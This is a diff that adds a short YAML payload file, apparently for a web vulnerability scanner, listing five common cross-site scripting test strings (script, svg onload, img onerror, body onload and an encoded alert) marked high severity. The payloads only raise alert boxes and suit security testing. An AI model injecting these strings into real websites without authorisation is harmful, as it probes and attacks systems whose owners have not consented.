@@ -1,0 +1,9 @@
+name: Cross-site Scripting (XSS) Variant 2
+payloads:
+- <script>alert(1)</script>
+- '"><svg/onload=alert(1)>'
+- <img src=x onerror=alert('xss')>
+- <body onload=alert('XSS')>
+- ''';alert(String.fromCharCode(88,83,83))//'
+severity: high
+type: xss
